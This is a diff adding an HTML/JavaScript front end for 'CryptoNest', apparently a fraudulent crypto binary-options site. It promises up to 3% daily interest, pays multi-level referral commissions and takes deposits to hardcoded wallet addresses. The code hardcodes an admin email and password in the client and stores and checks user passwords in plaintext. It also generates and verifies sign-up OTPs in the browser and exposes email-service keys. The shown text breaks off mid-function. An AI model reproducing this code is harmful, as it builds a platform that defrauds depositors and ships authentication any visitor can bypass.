@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>CryptoNest — Premium Trading</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+:root {
+  --bg: #09090b;
+  --surface: #121217;
+  --surface-hover: #1c1c24;
+  --border: #272732;
+  --text-main: #f4f4f5;
+  --text-muted: #a1a1aa;
+  --primary: #06b6d4;
+  --primary-hover: #0891b2;
+  --up: #10b981;
+  --down: #ef4444;
+  --gold: #f59e0b;
+  --font: 'Inter', system-ui, sans-serif;
+  --radius: 12px;
+}
+* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: var(--font); }
+html, body { margin: 0; background: var(--bg); color: var(--text-main); overflow-x: hidden; }
+button, input, select { font: inherit; border: none; outline: none; background: none; color: inherit; }
+button { cursor: pointer; }
+a { text-decoration: none; color: inherit; }
+.hidden { display: none !important; }
+
+/* App Layout */
+.app { min-height: 100vh; padding-bottom: 80px; }
+.topbar { height: 64px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(9, 9, 11, 0.85); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); position: fixed; top: 0; width: 100%; z-index: 100; }
+.brand { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; display: flex; align-items: center; gap: 8px; }
+.brand-icon { width: 24px; height: 24px; background: linear-gradient(135deg, var(--primary), #3b82f6); border-radius: 6px; }
+.balance-pill { font-size: 13px; font-weight: 600; padding: 6px 14px; border-radius: 20px; background: var(--surface); border: 1px solid var(--border); }
+
+/* Bottom Nav */
+.bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; height: 70px; background: rgba(18, 18, 23, 0.95); backdrop-filter: blur(20px); border-top: 1px solid var(--border); display: flex; justify-content: space-around; z-index: 100; }
+.nav-item { color: var(--text-muted); font-size: 11px; font-weight: 500; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 20%; transition: 0.2s; }
+.nav-item svg { width: 22px; height: 22px; margin-bottom: 4px; fill: currentColor; }
+.nav-item.active { color: var(--primary); }
+
+/* Pages */
+.page { display: none; padding-top: 64px; animation: fadeIn 0.3s ease; }
+.page.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: none; } }
+
+/* Home / Markets */
+.page-title { padding: 24px 20px 10px; font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+.market-table { width: 100%; border-collapse: collapse; }
+.market-table th { text-align: left; padding: 12px 20px; font-size: 12px; color: var(--text-muted); font-weight: 500; border-bottom: 1px solid var(--border); }
+.market-table th:last-child, .market-table td:last-child { text-align: right; }
+.market-row { border-bottom: 1px solid var(--border); cursor: pointer; transition: 0.2s; }
+.market-row:active { background: var(--surface-hover); }
+.market-row td { padding: 16px 20px; }
+.coin-info { display: flex; align-items: center; gap: 12px; }
+.coin-icon { width: 32px; height: 32px; border-radius: 50%; background: var(--surface-hover); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; color: var(--primary); }
+.coin-name { font-weight: 600; font-size: 15px; }
+.coin-pair { font-size: 12px; color: var(--text-muted); }
+.price-col { font-weight: 600; font-size: 15px; }
+.change-col { font-size: 13px; font-weight: 600; padding: 4px 8px; border-radius: 6px; display: inline-block; }
+.bg-up { background: rgba(16, 185, 129, 0.1); color: var(--up); }
+.bg-down { background: rgba(239, 68, 68, 0.1); color: var(--down); }
+
+/* Trade */
+.trade-header { display: flex; justify-content: space-between; align-items: flex-start; padding: 16px 20px; border-bottom: 1px solid var(--border); }
+.trade-title-area { display: flex; flex-direction: column; gap: 4px; }
+.trade-pair-name { font-size: 20px; font-weight: 700; }
+.trade-price-display { font-size: 24px; font-weight: 700; color: var(--up); }
+.trade-change-display { font-size: 13px; font-weight: 600; }
+#tvchart-container { height: 350px; width: 100%; border-bottom: 1px solid var(--border); }
+.trade-panel { padding: 20px; background: var(--surface); border-radius: 20px 20px 0 0; margin-top: -10px; position: relative; z-index: 2; }
+.tabs { display: flex; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+.tab { flex: 1; text-align: center; padding: 12px 0; font-size: 14px; font-weight: 600; color: var(--text-muted); cursor: pointer; border-bottom: 2px solid transparent; transition: 0.2s; }
+.tab.active { color: var(--text-main); border-bottom-color: var(--primary); }
+.input-group { background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; display: flex; align-items: center; margin-bottom: 16px; }
+.input-group input { flex: 1; font-size: 18px; font-weight: 600; }
+.input-group span { color: var(--text-muted); font-size: 14px; font-weight: 600; }
+.btn-container { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+.btn-primary { background: var(--primary); color: #000; font-size: 16px; font-weight: 700; padding: 16px; border-radius: var(--radius); text-align: center; transition: 0.2s; }
+.btn-primary:active { transform: scale(0.98); }
+.btn-danger { background: var(--down); color: #fff; font-size: 16px; font-weight: 700; padding: 16px; border-radius: var(--radius); text-align: center; transition: 0.2s; }
+.btn-danger:active { transform: scale(0.98); }
+
+/* Assets/Wallet */
+.assets-card { margin: 20px; background: linear-gradient(135deg, #1e293b, #0f172a); border-radius: var(--radius); padding: 24px; border: 1px solid var(--border); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.assets-label { font-size: 14px; color: var(--text-muted); display: flex; justify-content: space-between; }
+.assets-amt { font-size: 36px; font-weight: 700; margin: 8px 0; }
+.assets-sub { font-size: 13px; color: var(--text-muted); }
+.action-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin: 0 20px; }
+.action-btn { background: var(--surface); border: 1px solid var(--border); padding: 16px 8px; border-radius: var(--radius); display: flex; flex-direction: column; align-items: center; gap: 8px; font-size: 12px; font-weight: 600; transition: 0.2s; }
+.action-btn:active { background: var(--surface-hover); }
+.action-btn svg { width: 24px; height: 24px; fill: var(--primary); }
+
+/* Keeper UI */
+.keeper-card { margin: 20px; background: linear-gradient(135deg, #2c1f05, #1a1204); border-radius: var(--radius); padding: 24px; border: 1px solid rgba(245,158,11,0.3); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.keeper-label { font-size: 14px; color: var(--gold); font-weight: 600; display: flex; justify-content: space-between; }
+.keeper-amt { font-size: 36px; font-weight: 700; margin: 8px 0; color: #fff; }
+.keeper-sub { font-size: 13px; color: rgba(255,255,255,0.7); }
+.keeper-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
+.keeper-btn { background: rgba(245,158,11,0.2); color: var(--gold); border: 1px solid rgba(245,158,11,0.5); padding: 12px; border-radius: 8px; font-weight: 700; font-size: 14px; text-align: center; }
+.keeper-btn:active { background: rgba(245,158,11,0.3); }
+
+/* Profile & Referral */
+.profile-header { padding: 24px 20px; border-bottom: 1px solid var(--border); }
+.profile-name { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
+.profile-email { font-size: 13px; color: var(--text-muted); }
+.section-title { font-size: 16px; font-weight: 700; margin: 24px 20px 12px; }
+.ref-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin: 0 20px 20px; padding: 20px; }
+.ref-link-box { display: flex; gap: 8px; margin-top: 12px; }
+.ref-link-box input { flex: 1; background: var(--bg); border: 1px solid var(--border); padding: 12px; border-radius: 8px; color: var(--primary); font-size: 13px; }
+.ref-link-box button { background: var(--primary); color: #000; padding: 0 16px; border-radius: 8px; font-weight: 700; font-size: 13px; }
+.ref-stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
+.ref-stat-box { background: var(--bg); padding: 16px; border-radius: 8px; border: 1px solid var(--border); text-align: center; }
+.ref-stat-box .label { font-size: 12px; color: var(--text-muted); }
+.ref-stat-box .value { font-size: 20px; font-weight: 700; color: var(--up); margin-top: 4px; }
+.ref-levels { margin: 0 20px; border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+.ref-level-item { display: flex; justify-content: space-between; padding: 14px 20px; border-bottom: 1px solid var(--border); font-size: 14px; }
+.ref-level-item:last-child { border-bottom: none; }
+.profile-action-row { margin: 24px 20px; }
+.logout-btn { width: 100%; background: rgba(239, 68, 68, 0.1); color: var(--down); border: 1px solid rgba(239, 68, 68, 0.3); padding: 16px; border-radius: var(--radius); font-weight: 700; font-size: 15px; transition: 0.2s; }
+.logout-btn:active { background: rgba(239, 68, 68, 0.2); }
+
+/* Admin */
+.admin-card { background: var(--surface); border: 1px solid var(--border); margin: 16px 20px; padding: 16px; border-radius: var(--radius); font-size: 13px; }
+.admin-card b { color: var(--primary); }
+
+/* Modals */
+.modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: flex-end; z-index: 200; }
+.modal-overlay.active { display: flex; }
+.modal-content { background: var(--surface); width: 100%; max-width: 480px; border-radius: 24px 24px 0 0; padding: 24px; transform: translateY(100%); transition: transform 0.3s ease; max-height: 90vh; overflow-y: auto; }
+.modal-overlay.active .modal-content { transform: translateY(0); }
+.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+.modal-title { font-size: 18px; font-weight: 700; }
+.close-btn { font-size: 24px; color: var(--text-muted); cursor: pointer; }
+.warning-box { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: var(--down); padding: 12px; border-radius: 8px; font-size: 12px; margin-bottom: 16px; line-height: 1.4; }
+
+/* Auth Screen */
+.auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; padding: 20px; z-index: 500; overflow-y: auto; }
+.auth-box { width: 100%; max-width: 400px; background: var(--surface); padding: 32px 24px; border-radius: 20px; border: 1px solid var(--border); box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
+.auth-logo { text-align: center; margin-bottom: 32px; }
+.auth-logo h1 { font-size: 28px; font-weight: 700; margin: 0; letter-spacing: -1px; }
+.auth-logo h1 span { color: var(--primary); }
+.auth-logo p { font-size: 13px; color: var(--text-muted); margin-top: 8px; }
+.auth-input { width: 100%; background: var(--bg); border: 1px solid var(--border); padding: 14px 16px; border-radius: var(--radius); margin-bottom: 16px; font-size: 14px; transition: 0.2s; }
+.auth-input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(6, 182, 212, 0.1); }
+.auth-btn { width: 100%; background: var(--primary); color: #000; padding: 16px; border-radius: var(--radius); font-weight: 700; font-size: 15px; margin-top: 8px; transition: 0.2s; }
+.auth-btn:active { transform: scale(0.98); }
+.auth-switch { text-align: center; margin-top: 20px; font-size: 13px; color: var(--text-muted); }
+.auth-switch span { color: var(--primary); cursor: pointer; font-weight: 600; }
+.auth-support { text-align: center; margin-top: 24px; padding-top: 16px; border-top: 1px solid var(--border); }
+.auth-support a { font-size: 13px; color: var(--primary); font-weight: 600; }
+
+/* OTP Inputs */
+.otp-group { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
+.otp-input { width: 45px; height: 50px; text-align: center; font-size: 20px; font-weight: 700; background: var(--bg); border: 1px solid var(--border); border-radius: 8px; color: var(--text-main); }
+.otp-input:focus { border-color: var(--primary); }
+
+/* Toast */
+.toast { position: fixed; top: 80px; left: 50%; transform: translateX(-50%) translateY(-20px); background: var(--surface); color: var(--text-main); padding: 12px 24px; border-radius: 8px; font-size: 13px; font-weight: 600; z-index: 1000; opacity: 0; transition: 0.3s; pointer-events: none; border: 1px solid var(--border); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+
+<!-- Auth Screen -->
+<div id="authScreen" class="auth-screen">
+  <div class="auth-box">
+    <div class="auth-logo">
+      <h1>Crypto<span>Nest</span></h1>
+      <p>Premium Digital Asset Exchange</p>
+    </div>
+    
+    <!-- Login -->
+    <div id="loginForm">
+      <input id="loginEmail" class="auth-input" type="email" placeholder="Email Address">
+      <input id="loginPass" class="auth-input" type="password" placeholder="Password">
+      <div style="text-align:right; margin-top:-10px; margin-bottom:16px;">
+        <span onclick="showForgotPassword()" style="font-size:12px; color:var(--text-muted); cursor:pointer;">Forgot Password?</span>
+      </div>
+      <button class="auth-btn" onclick="handleLogin()">Log In</button>
+      <div class="auth-switch">Don't have an account? <span onclick="toggleAuthForm('register')">Register</span></div>
+      <div class="auth-support"><a href="https://t.me/EZpay_Zyloxc" target="_blank">💬 Customer Support</a></div>
+    </div>
+
+    <!-- Register -->
+    <div id="registerForm" class="hidden">
+      <input id="regName" class="auth-input" type="text" placeholder="Full Name">
+      <input id="regMobile" class="auth-input" type="tel" placeholder="Mobile Number">
+      <input id="regEmail" class="auth-input" type="email" placeholder="Email Address">
+      <input id="regPass" class="auth-input" type="password" placeholder="Password (min 6 chars)">
+      <input id="regRef" class="auth-input" type="text" placeholder="Referral Code (Optional)">
+      <button class="auth-btn" onclick="requestOTP()">Send OTP</button>
+      <div class="auth-switch">Already have an account? <span onclick="toggleAuthForm('login')">Log In</span></div>
+      <div class="auth-support"><a href="https://t.me/EZpay_Zyloxc" target="_blank">💬 Customer Support</a></div>
+    </div>
+
+    <!-- OTP -->
+    <div id="otpForm" class="hidden">
+      <p style="text-align:center; font-size:14px; color:var(--text-muted); margin-bottom:8px;">Enter the 6-digit code sent to</p>
+      <p style="text-align:center; font-weight:600; color:var(--primary); margin-bottom:16px;" id="otpEmailDisplay"></p>
+      <div class="otp-group">
+        <input class="otp-input" id="otp1" maxlength="1" oninput="moveFocus(this,'otp2')">
+        <input class="otp-input" id="otp2" maxlength="1" oninput="moveFocus(this,'otp3')">
+        <input class="otp-input" id="otp3" maxlength="1" oninput="moveFocus(this,'otp4')">
+        <input class="otp-input" id="otp4" maxlength="1" oninput="moveFocus(this,'otp5')">
+        <input class="otp-input" id="otp5" maxlength="1" oninput="moveFocus(this,'otp6')">
+        <input class="otp-input" id="otp6" maxlength="1" oninput="moveFocus(this,'')">
+      </div>
+      <button class="auth-btn" id="verifyOtpBtn" onclick="verifyOTP()">Verify & Create Account</button>
+      <div class="auth-switch" style="margin-top:16px;">
+        <span onclick="requestOTP()" style="color:var(--gold);">Resend OTP</span> | 
+        <span onclick="toggleAuthForm('register')" style="color:var(--text-muted);">Back</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Main App -->
+<div id="mainApp" class="app hidden">
+  <header class="topbar">
+    <div class="brand"><div class="brand-icon"></div>CryptoNest</div>
+    <div class="balance-pill" id="topBarBalance">0.00 USDT</div>
+  </header>
+
+  <!-- HOME -->
+  <section id="page-home" class="page active">
+    <div class="page-title">Markets</div>
+    <table class="market-table">
+      <thead><tr><th>Pair</th><th>Price</th><th>24h Change</th></tr></thead>
+      <tbody id="marketListBody"></tbody>
+    </table>
+  </section>
+
+  <!-- TRADE -->
+  <section id="page-trade" class="page">
+    <div class="trade-header">
+      <div class="trade-title-area">
+        <select id="tradeCoinSelect" class="trade-pair-name" style="background:none;border:none;color:var(--text-main);font-size:20px;font-weight:700;outline:none;" onchange="changeCoin(this.value)"></select>
+        <div class="trade-price-display" id="tradeCurrentPrice">0.00</div>
+        <div class="trade-change-display" id="tradeChangePercent">0.00%</div>
+      </div>
+    </div>
+    
+    <div id="tvchart-container">
+      <div id="tvchart"></div>
+    </div>
+
+    <div class="trade-panel">
+      <div class="tabs">
+        <div class="tab active" onclick="switchTradeTab('trade', this)">Trade</div>
+        <div class="tab" onclick="switchTradeTab('open', this)">Open Positions</div>
+        <div class="tab" onclick="switchTradeTab('history', this)">History</div>
+      </div>
+      
+      <div id="tradeForm">
+        <div class="input-group">
+          <input id="tradeAmount" type="number" placeholder="Amount (USDT)" value="10">
+          <span>USDT</span>
+        </div>
+        <div class="btn-container">
+          <button class="btn-primary" onclick="placeTrade('up')">▲ CALL</button>
+          <button class="btn-danger" onclick="placeTrade('down')">▼ PUT</button>
+        </div>
+      </div>
+      
+      <div id="openPositionsList" class="hidden"></div>
+      <div id="tradeHistoryList" class="hidden"></div>
+    </div>
+  </section>
+
+  <!-- ASSETS / WALLET -->
+  <section id="page-wallet" class="page">
+    <div class="assets-card">
+      <div class="assets-label"><span>Total Assets (Wallet)</span> <span>USDT</span></div>
+      <div class="assets-amt" id="walletBalance">0.00</div>
+      <div class="assets-sub">Today's PnL: 0.00 USDT</div>
+    </div>
+
+    <!-- Keeper Section -->
+    <div class="keeper-card">
+      <div class="keeper-label"><span>Keeper Balance</span> <span>USDT</span></div>
+      <div class="keeper-amt" id="keeperBalance">0.00</div>
+      <div class="keeper-sub">Earn up to <b>3% daily interest</b> on your Keeper funds. Daily payout: <b>1.2%</b></div>
+      <div class="keeper-btns">
+        <button class="keeper-btn" onclick="openKeeperModal('in')">Deposit to Keeper</button>
+        <button class="keeper-btn" onclick="openKeeperModal('out')">Withdraw to Wallet</button>
+      </div>
+    </div>
+
+    <div class="action-grid">
+      <div class="action-btn" onclick="openModal('deposit')">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>Deposit
+      </div>
+      <div class="action-btn" onclick="openModal('withdraw')">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z" transform="rotate(180 12 12)"/></svg>Withdraw
+      </div>
+      <div class="action-btn" onclick="openModal('convert')">
+        <svg viewBox="0 0 24 24"><path d="M16 17.01V10h-2v7.01h-3L15 21l4-3.99h-3zM9 3L5 6.99h3V14h2V6.99h3L9 3z"/></svg>Convert
+      </div>
+      <div class="action-btn" onclick="go('history', document.querySelector('.nav-item[data-page=\'history\']'))">
+        <svg viewBox="0 0 24 24"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>History
+      </div>
+    </div>
+  </section>
+
+  <!-- HISTORY -->
+  <section id="page-history" class="page">
+    <div class="page-title">Transactions</div>
+    <div id="fullHistoryList" style="padding: 0 20px;"></div>
+  </section>
+
+  <!-- PROFILE & REFERRAL -->
+  <section id="page-profile" class="page">
+    <div class="profile-header">
+      <div class="profile-name" id="profName">User Name</div>
+      <div class="profile-email" id="profEmail">email@example.com</div>
+    </div>
+
+    <div class="section-title">Referral Program</div>
+    <div class="ref-card">
+      <div style="font-size:14px; font-weight:600; margin-bottom:8px;">Your Personal Link</div>
+      <div class="ref-link-box">
+        <input id="refLinkInput" type="text" readonly>
+        <button onclick="copyRefLink()">Copy</button>
+      </div>
+      <div class="ref-stats-grid">
+        <div class="ref-stat-box">
+          <div class="label">Total Referrals</div>
+          <div class="value" id="refCount">0</div>
+        </div>
+        <div class="ref-stat-box">
+          <div class="label">Commission Earned</div>
+          <div class="value" id="refCommission">0.00 USDT</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-title">Commission Levels</div>
+    <div class="ref-levels">
+      <div class="ref-level-item"><span>Level 1 (Direct)</span><span style="color:var(--gold); font-weight:600;">4%</span></div>
+      <div class="ref-level-item"><span>Level 2</span><span style="color:var(--gold); font-weight:600;">3%</span></div>
+      <div class="ref-level-item"><span>Level 3</span><span style="color:var(--gold); font-weight:600;">2%</span></div>
+      <div class="ref-level-item"><span>Level 4</span><span style="color:var(--gold); font-weight:600;">1%</span></div>
+      <div class="ref-level-item"><span>Level 5</span><span style="color:var(--gold); font-weight:600;">0.5%</span></div>
+      <div class="ref-level-item"><span>Level 6</span><span style="color:var(--gold); font-weight:600;">0.25%</span></div>
+    </div>
+
+    <div class="section-title">Account Settings</div>
+    <div style="padding: 0 20px;">
+      <input id="editName" class="auth-input" placeholder="Full Name">
+      <input id="editMobile" class="auth-input" placeholder="Mobile Number">
+      <button class="btn-primary" style="width:100%; margin-bottom:16px;" onclick="saveProfile()">Save Changes</button>
+      
+      <button class="logout-btn" onclick="handleLogout()">Log Out</button>
+    </div>
+  </section>
+
+  <!-- ADMIN -->
+  <section id="page-admin" class="page">
+    <div class="page-title" style="color:var(--gold);">Admin Panel</div>
+    <div class="section-title" style="margin-top:0;">Pending Requests</div>
+    <div id="adminPendingList" style="padding: 0 20px;"></div>
+    <div class="section-title">All Users</div>
+    <div id="adminUsersList" style="padding: 0 20px 40px;"></div>
+  </section>
+
+  <!-- Bottom Nav -->
+  <nav class="bottom-nav">
+    <div class="nav-item active" data-page="home" onclick="go('home', this)">
+      <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>Home
+    </div>
+    <div class="nav-item" data-page="trade" onclick="go('trade', this)">
+      <svg viewBox="0 0 24 24"><path d="M3.5 18.49l6-6.01 4 4L22 6.92l-1.41-1.41-7.09 7.97-4-4L2 16.99z"/></svg>Trade
+    </div>
+    <div class="nav-item" data-page="wallet" onclick="go('wallet', this)">
+      <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>Assets
+    </div>
+    <div class="nav-item" data-page="history" onclick="go('history', this)">
+      <svg viewBox="0 0 24 24"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>History
+    </div>
+    <div class="nav-item" data-page="profile" onclick="go('profile', this)">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>Profile
+    </div>
+    <div class="nav-item hidden" id="navAdmin" data-page="admin" onclick="go('admin', this)">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>Admin
+    </div>
+  </nav>
+</div>
+
+<!-- Modal Overlay -->
+<div id="modalOverlay" class="modal-overlay" onclick="closeModal(event)">
+  <div class="modal-content" id="modalContent" onclick="event.stopPropagation()"></div>
+</div>
+
+<!-- Toast -->
+<div id="toast" class="toast"></div>
+
+<!-- Libraries -->
+<script src="https://s3.tradingview.com/tv.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+/* ================= CONFIG ================= */
+const ADMIN_EMAIL = "kaitoreignx@gmail.com";
+const DOMAIN = "https://earnify.fun";
+const ADDRESSES = {
+  ERC20: "0x2D24CC766D829a3acB9B9C8568D04007ac7D645e",
+  TRC20: "TJxPeiysh2CCWAcBJzWipjQciEUKryw6v4",
+  BEP20: "0x2D24CC766D829a3acB9B9C8568D04007ac7D645e"
+};
+const SYMBOLS = ["BTCUSDT","ETHUSDT","SOLUSDT","BNBUSDT","XRPUSDT","ADAUSDT","DOGEUSDT","AVAXUSDT","LINKUSDT","TONUSDT","DOTUSDT","MATICUSDT","SHIBUSDT","LTCUSDT","TRXUSDT","UNIUSDT","ATOMUSDT","ETCUSDT","XLMUSDT","BCHUSDT","FILUSDT","NEARUSDT","APTUSDT","ARBUSDT","OPUSDT","INJUSDT","SUIUSDT","SEIUSDT","TIAUSDT","RNDRUSDT","FETUSDT","PEPEUSDT","WIFUSDT","ORDIUSDT","JUPUSDT","STRKUSDT","WLDUSDT","BONKUSDT","FLOKIUSDT","GALAUSDT"];
+
+const SUPABASE_URL = "https://jnjbmzwxgugbdpiomdks.supabase.co";
+const SUPABASE_KEY = "sb_publishable_-6R2uRPbi8bwXKv5i4d8ow_aDXyUwAE";
+const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+/* ================= STATE ================= */
+let currentUser = null;
+let currentCoin = "BTCUSDT";
+let tickerData = {};
+let tvWidget = null;
+let pendingOTP = null;
+
+/* ================= UTILS ================= */
+const $ = id => document.getElementById(id);
+function toast(msg) {
+  const t = $("toast");
+  t.textContent = msg;
+  t.classList.add("show");
+  clearTimeout(window.toastTimer);
+  window.toastTimer = setTimeout(() => t.classList.remove("show"), 3000);
+}
+function fmt(n) { return Number(n).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 }); }
+function moveFocus(el, nextId) {
+  if (el.value.length === 1 && nextId) $(nextId).focus();
+}
+
+/* ================= AUTHENTICATION ================= */
+function toggleAuthForm(formName) {
+  $("loginForm").classList.add("hidden");
+  $("registerForm").classList.add("hidden");
+  $("otpForm").classList.add("hidden");
+  
+  if (formName === "login") $("loginForm").classList.remove("hidden");
+  if (formName === "register") $("registerForm").classList.remove("hidden");
+  if (formName === "otp") $("otpForm").classList.remove("hidden");
+}
+
+// Session Persistence & Referral Link Check
+function checkSession() {
+  const savedUser = localStorage.getItem("cryptonest_session");
+  if (savedUser) {
+    currentUser = JSON.parse(savedUser);
+    enterApp();
+  } else {
+    const urlParams = new URLSearchParams(window.location.search);
+    const refId = urlParams.get('ref');
+    
+    if (refId) {
+      toggleAuthForm('register');
+      $("regRef").value = refId;
+      toast("Referral link applied successfully!");
+    } else {
+      toggleAuthForm('login');
+    }
+  }
+}
+
+async function handleLogin() {
+  const email = $("loginEmail").value.trim().toLowerCase();
+  const pass = $("loginPass").value;
+  if (!email || !pass) return toast("Please enter credentials.");
+
+  // Admin Check
+  if (email === ADMIN_EMAIL && pass === "Captain@2007") {
+    let { data: admin } = await supabaseClient.from('users').select('*').eq('email', email).maybeSingle();
+    if (!admin) {
+      await supabaseClient.from('users').insert([{ email, password: pass, name: "Admin", role: "admin", balance: 10000 }]);
+    }
+    currentUser = { email, role: "admin", balance: 10000, id: admin ? admin.id : "ADMIN", keeper_balance: 0 };
+    localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+    enterApp(); return;
+  }
+
+  // User Login
+  const { data: user, error } = await supabaseClient.from('users').select('*').eq('email', email).eq('password', pass).maybeSingle();
+  
+  if (error) {
+    console.error("Login Error:", error);
+    return toast("Database error. Please try again.");
+  }
+  if (!user) return toast("Invalid email or password.");
+  
+  currentUser = user;
+  localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+  enterApp();
+}
+
+function handleLogout() {
+  localStorage.removeItem("cryptonest_session");
+  currentUser = null;
+  $("mainApp").classList.add("hidden");
+  $("authScreen").classList.remove("hidden");
+  toggleAuthForm("login");
+  $("loginEmail").value = "";
+  $("loginPass").value = "";
+}
+
+// Registration & OTP
+async function requestOTP() {
+  const name = $("regName").value.trim();
+  const mobile = $("regMobile").value.trim();
+  const email = $("regEmail").value.trim().toLowerCase();
+  const pass = $("regPass").value;
+  const refCode = $("regRef").value.trim();
+
+  if (!name || !mobile || !email || pass.length < 6) return toast("Fill all details (Pass min 6 chars).");
+
+  const { data: existing } = await supabaseClient.from('users').select('email').eq('email', email).maybeSingle();
+  if (existing) return toast("Email already registered.");
+
+  const otp = String(Math.floor(100000 + Math.random() * 900000));
+  pendingOTP = { name, mobile, email, pass, refCode, otp };
+
+  toggleAuthForm("otp");
+  $("otpEmailDisplay").textContent = email;
+  document.querySelectorAll('.otp-input').forEach(i => i.value = "");
+  $("otp1").focus();
+
+  try {
+    await fetch("https://api.emailjs.com/api/v1.0/email/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        service_id: "service_oc75guu",
+        template_id: "template_5751mdd",
+        user_id: "54KKOYgNGmL9IAuvh",
+        template_params: { to_email: email, otp_code: otp }
+      })
+    });
+    toast("OTP sent to your email.");
+  } catch (e) {
+    console.warn("Email error", e);
+    toast("Error sending OTP. Check console.");
+  }
+}
+
+async function verifyOTP() {
+  if (!pendingOTP) return toast("Session expired.");
+  let entered = "";
+  for (let i = 1; i <= 6; i++) entered += $(`otp${i}`).value;
+  if (entered !== pendingOTP.otp) return toast("Incorrect OTP.");
+
+  const btn = $("verifyOtpBtn"); btn.textContent = "Creating..."; btn.disabled = true;
+
+  let referrerId = null;
+  if (pendingOTP.refCode) {
+    const { data: refUser } = await supabaseClient.from('users').select('id').eq('id', pendingOTP.refCode).maybeSingle();
+    if (refUser) referrerId = refUser.id;
+  }
+
